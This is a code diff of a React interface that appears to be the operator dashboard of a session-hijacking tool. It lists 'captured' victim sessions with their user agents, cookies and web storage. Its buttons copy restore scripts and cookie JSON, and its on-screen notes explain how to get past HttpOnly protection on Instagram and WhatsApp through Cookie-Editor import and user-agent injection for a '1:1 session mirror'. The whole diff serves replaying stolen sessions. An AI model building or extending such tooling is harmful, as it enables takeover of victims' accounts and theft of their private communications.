-                            <Clock size={16} className="text-blue-500" /> CAPTURED: {new Date(selectedSession.captured_at).toLocaleString()}
-                          </div>
-                          <div className="text-blue-400 font-black text-[10px] mt-1 tracking-widest uppercase">{accountMap[selectedSession.id]?.domain}</div>
+                          <h3 className="text-5xl font-black text-white">{accountMap[selectedSession.id]?.platform}</h3>
+                          <p className="text-[10px] font-black text-blue-400/60 uppercase tracking-[0.3em] mt-1">{accountMap[selectedSession.id]?.domain}</p>
                         </div>
                       </div>
-
-                      <div className="p-6 rounded-[2.5rem] bg-blue-500/5 border border-blue-500/10 shadow-inner">
-                        <div className="flex items-center justify-between mb-4">
-                            <div className="flex items-center gap-3 text-blue-400 font-black text-[11px] uppercase tracking-[0.2em]">
-                                <Monitor size={20} /> CRYPTOGRAPHIC SIGNATURE (UA)
+                      <div className="bg-blue-500/5 border border-blue-500/10 p-6 rounded-[2.5rem]">
+                        <div className="flex justify-between items-center mb-4 text-[10px] font-black text-blue-400 tracking-widest uppercase">
+                          <span>Sign Record</span>
+                          <button onClick={() => navigator.clipboard.writeText(selectedSession.user_agent||"")} className="px-3 py-1.5 rounded-xl bg-blue-500/20 hover:bg-blue-500/30 transition-all border border-blue-500/20 flex gap-2 items-center"><Copy size={12}/>{copiedUA?"COPIED":"COPY UA"}</button>
+                        </div>
+                        <div className="text-[10px] font-mono p-5 bg-black/60 rounded-2xl border border-white/5 break-all text-gray-500 leading-relaxed shadow-inner">{selectedSession.user_agent}</div>
+                      </div>
+                      <div className="grid grid-cols-2 gap-6 h-64">
+                         <div className="glass bg-black/40 rounded-[2.5rem] border border-white/5 flex flex-col overflow-hidden">
+                            <div className="p-4 border-b border-white/5 bg-white/5 flex justify-between text-[9px] font-black text-blue-400 tracking-widest uppercase"><span>Cookie Index</span><span>{cookies.filter(c=>c.domain.toLowerCase().includes(deviceSearch.toLowerCase())).length}</span></div>
+                            <div className="flex-1 overflow-y-auto p-4 space-y-2 custom-scrollbar">
+                               {cookies.filter(c=>c.domain.toLowerCase().includes(deviceSearch.toLowerCase())).map((c,i)=>(
+                                 <div key={i} className="text-[9px] font-mono text-gray-400 p-2 bg-white/5 rounded-xl border border-white/5 truncate hover:border-blue-500/30 transition-colors"><span className="text-blue-400/60">{c.domain}</span><br/>{c.name}</div>
+                               ))}
                             </div>
-                            {selectedSession.user_agent && <div className="text-[10px] font-black text-emerald-400">MATCH VALIDATED</div>}
-                            <button 
-                                onClick={() => {
-                                    navigator.clipboard.writeText(selectedSession.user_agent || "");
-                                    setCopiedUA(true);
-                                    setTimeout(() => setCopiedUA(false), 3000);
-                                }}
-                                className="px-3 py-1.5 rounded-xl bg-blue-500/20 text-blue-400 hover:bg-blue-500/30 transition-all flex items-center gap-2 group border border-blue-500/20"
-                            >
-                                {copiedUA ? <Check size={12} /> : <Copy size={12} />}
-                                {copiedUA ? "COPIED" : "COPY UA"}
-                            </button>
-                        </div>
-                        {selectedSession.user_agent ? (
-                          <div className="text-xs font-mono text-gray-500 break-all leading-relaxed bg-black/60 p-6 rounded-3xl border border-white/5 shadow-2xl">
-                            {selectedSession.user_agent}
-                          </div>
-                        ) : (
-                          <div className="flex flex-col items-center justify-center gap-4 p-8 bg-red-500/5 rounded-3xl border border-red-500/10 text-center">
-                            <AlertCircle size={32} className="text-red-500/40" />
-                            <p className="text-xs text-gray-500 font-bold max-w-[240px] uppercase tracking-wider">
-                              Signature Missing. Reverting to standard Windows/Chrome headers is recommended.
-                            </p>
-                          </div>
-                        )}
-                      </div>
-                    </div>
-
-                    <div className="flex flex-col justify-center space-y-6">
-                      <div className="flex flex-col gap-4">
-                        <div className="flex items-center justify-between px-4 text-emerald-400 font-black text-xs uppercase tracking-[0.3em]">
-                          <div className="flex items-center gap-3 animate-pulse"><Check size={22} /> RESTORE ARCHIVE ({cookies.length})</div>
-                          {cookies.some(c => c.http_only) && (
-                            <div className="flex items-center gap-2 text-amber-400 bg-amber-400/10 px-4 py-2 rounded-full border border-amber-500/20 shadow-lg shadow-amber-500/5">
-                              <AlertCircle size={16} /> HTTPONLY ACTIVATED
+                         </div>
+                         <div className="glass bg-black/40 rounded-[2.5rem] border border-white/5 flex flex-col overflow-hidden">
+                            <div className="p-4 border-b border-white/5 bg-white/5 flex justify-between text-[9px] font-black text-emerald-400 tracking-widest uppercase"><span>Deep Storage</span><span>{webStorage.length}</span></div>
+                            <div className="flex-1 overflow-y-auto p-4 space-y-2 custom-scrollbar">
+                               {webStorage.map((s,i)=>(
+                                 <div key={i} className="text-[9px] font-mono text-gray-400 p-2 bg-white/5 rounded-xl border border-white/5"><span className="text-emerald-400/60">{s.domain}</span><br/><span className="text-white/20">{s.storage_type}</span>: {s.key}</div>
+                               ))}
                             </div>
-                          )}
-                        </div>
-                        
-                        <div className="flex flex-col gap-5">
-                          <button 
-                            onClick={copyToClipboard}
-                            className={"w-full flex items-center justify-center gap-5 px-10 py-7 rounded-[2.5rem] font-black text-3xl shadow-3xl transition-all active:scale-95 group " + (copied ? "bg-emerald-600 shadow-emerald-500/40" : "bg-blue-600 hover:bg-blue-500 shadow-blue-500/40 border-t-2 border-white/20")}
-                          >
-                            {copied ? <><Check size={40} /> RESTORED</> : <><Copy size={40} className="group-hover:scale-110 transition-transform"/> CONSOLE BOOT</>}
-                          </button>
-
-                          <div className="flex gap-5">
-                            <button 
-                              onClick={copyCookiesJson}
-                              className={"flex-1 flex items-center justify-center gap-4 p-6 rounded-[2rem] glass font-black text-sm uppercase tracking-widest transition-all " + (copiedJson ? "text-emerald-400 border-emerald-500/40 shadow-emerald-500/10" : "text-white/70 hover:bg-white/10 border-white/10 shadow-2xl")}
-                            >
-                              {copiedJson ? <><Check size={24} /> JSON COPIADO</> : <><FileJson size={24} /> COPIAR JSON (RECOMENDADO)</>}
-                            </button>
-                            <button onClick={() => setSelectedSession(null)} className="px-10 py-6 rounded-[2rem] glass font-black text-white/30 text-sm uppercase tracking-widest border-white/10 hover:text-white/60 transition-colors">
-                              DISMISS
-                            </button>
-                          </div>
-                          
-                          {webStorage.length > 0 && (
-                            <button 
-                              onClick={copyWhatsAppScript}
-                              className={"w-full flex items-center justify-center gap-4 p-6 rounded-[2rem] font-black text-sm uppercase tracking-widest transition-all " + (copiedStorage ? "bg-green-600 text-white shadow-green-500/40 shadow-2xl" : "bg-green-600/20 text-green-400 hover:bg-green-600/30 border border-green-500/30 shadow-2xl")}
-                            >
-                              {copiedStorage ? <><Check size={24} /> SCRIPT COPIADO</> : <><Download size={24} /> RESTORE DEEP STORAGE ({webStorage.length} entries)</>}
-                            </button>
-                          )}
-                        </div>
-                      </div>
-                      <div className="p-6 rounded-[2.5rem] bg-amber-500/5 border border-amber-500/20 flex gap-6 shadow-inner">
-                         <div className="p-4 rounded-2xl bg-amber-500/10 h-fit text-amber-400 shadow-lg"><Info size={24} /></div>
-                         <div>
-                            <p className="text-xs text-amber-200/50 leading-relaxed font-bold uppercase tracking-wide mb-1">Security Alert</p>
-                            <p className="text-[13px] text-amber-200/80 leading-relaxed font-medium">
-                                Instagram and highly secured portals use **HttpOnly** session tokens. The console method will fail to set them. **Use the JSON button** and import via **Cookie-Editor** for a 1:1 session mirror.
-                            </p>
                          </div>
                       </div>
+                    </div>
+                    <div className="flex flex-col justify-center space-y-8">
+                       <div className="space-y-4">
+                          <div className="relative"><Search className="absolute left-6 top-1/2 -translate-y-1/2 text-white/20" size={18} /><input value={deviceSearch} onChange={(e)=>setDeviceSearch(e.target.value)} placeholder="FILTER INDEX BY DOMAIN..." className="bg-black/60 border border-white/10 rounded-full w-full py-5 pl-14 pr-8 text-[11px] font-black text-white tracking-widest uppercase focus:border-blue-500 transition-all"/></div>
+                          <div className="p-6 bg-emerald-500/10 border border-emerald-500/20 rounded-[2.5rem] flex items-center justify-between text-emerald-400 font-black text-xs tracking-widest"><span>VERIFIED DATA READY</span><span className="bg-emerald-500/20 px-4 py-1.5 rounded-full border border-emerald-500/20 shadow-lg shadow-emerald-500/10">1:1 MIRROR</span></div>
+                          <button onClick={copyToClipboard} className={"w-full py-8 rounded-[3rem] font-black text-3xl transition-all active:scale-95 shadow-3xl " + (copied ? "bg-emerald-600 shadow-emerald-500/40" : "bg-blue-600 hover:bg-blue-500 shadow-blue-500/40 border-t-2 border-white/10")}>{copied ? "RESTORED" : "CONSOLE BOOT"}</button>
+                          <div className="flex gap-4">
+                             <button onClick={copyCookiesJson} className={"flex-1 p-6 rounded-[2.5rem] glass font-black text-[11px] tracking-widest uppercase transition-all " + (copiedJson ? "text-emerald-400 border-emerald-500/40" : "text-white/60 hover:bg-white/10 border-white/5")}>{copiedJson ? "JSON COPIED" : "EXPORT JSON"}</button>
+                             {webStorage.length > 0 && <button onClick={copyWhatsAppScript} className={"flex-1 p-6 rounded-[2.5rem] font-black text-[11px] tracking-widest uppercase transition-all " + (copiedStorage ? "bg-green-600 text-white" : "bg-green-600/20 text-green-400 border border-green-500/20")}>{copiedStorage ? "SCRIPT READY" : "DEEP RESTORE"}</button>}
+                          </div>
+                       </div>
+                       <div className="p-8 rounded-[3rem] bg-amber-500/5 border border-amber-500/20 flex gap-6 shadow-inner"><div className="p-4 bg-amber-500/10 rounded-2xl h-fit text-amber-500 shadow-lg"><Info size={24}/></div><div><p className="text-[11px] font-black tracking-widest uppercase text-amber-400 mb-2">Technical Note</p><p className="text-xs text-amber-200/50 leading-relaxed font-medium">Use high-precision import for Instagram and WhatsApp. Manual UA injection required for stable mirror persistence.</p></div></div>
                     </div>
                   </div>
                 </GlassCard>
